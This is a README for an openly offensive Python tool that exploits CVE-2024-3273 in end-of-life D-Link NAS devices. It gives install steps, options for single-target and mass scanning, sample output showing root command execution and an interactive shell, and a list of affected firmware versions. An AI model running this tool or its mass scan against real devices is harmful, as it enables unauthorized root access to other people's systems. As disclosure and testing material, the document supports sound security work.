# 🛠️ CVE-2024-3273 Exploit Tool

## 🌟 Introduction

This script is a powerful exploitation tool for the CVE-2024-3273 vulnerability found in specific versions of D-Link NAS devices. It enables command execution and unauthorized access to the affected devices.

## ⚙️ Installation

To set up the exploitation tool, follow these steps:

1. **Clone the repository**:

```bash
git clone https://github.com/Chocapikk/CVE-2024-3273.git
```

2. **Navigate to the tool's directory**:

```bash
cd CVE-2024-3273
```

3. **Install the required Python packages**:

```bash
pip install -r requirements.txt
```

## 🚀 Usage

To use the tool, run the script from the command line as follows:

```bash
python exploit.py [options]
```

### Options

- **-u, --url**:
  Specify the target URL or IP address.

- **-f, --file**:
  Specify a file containing a list of URLs to scan.

- **-t, --threads**:
  Set the number of threads for concurrent scanning.

- **-o, --output**:
  Define an output file to save the scan results.

When a single URL is provided with the `-u` option and the target is vulnerable, the script will attempt to open an interactive shell.

### Example

```bash
$ python3 exploit.py -u http://127.0.0.1
[+] Command executed successfully.
[!] http://127.0.0.1 is vulnerable to CVE-2024-3273: uid=0(root) gid=0(root)
[+] Opening interactive shell...
$ id
[+] Command executed successfully.
uid=0(root) gid=0(root)
```

## 📊 Mass Scanning

For mass scanning, use the `-f` option with a file containing URLs. The tool will scan each URL and print concise results, indicating whether each target is vulnerable.

```bash
python exploit.py -f urls.txt
```

## 🗒️ Affected Versions

The vulnerability affects the following versions of D-Link NAS devices:

- DNS-320L Version 1.11, Version 1.03.0904.2013, Version 1.01.0702.2013
- DNS-325 Version 1.01
- DNS-327L Version 1.09, Version 1.00.0409.2013
- DNS-340L Version 1.08

These systems are considered to be end-of-life (EOL), meaning they are no longer supported or receiving updates from the manufacturer. It is strongly recommended that these systems are no longer used.

## 🛡️ Disclaimer

Use this tool responsibly and ethically. Always obtain proper authorization before testing any system for vulnerabilities.

## 👏 Acknowledgments

Special thanks to the researcher [@netsecfish](https://github.com/netsecfish) for their work in identifying this vulnerability.
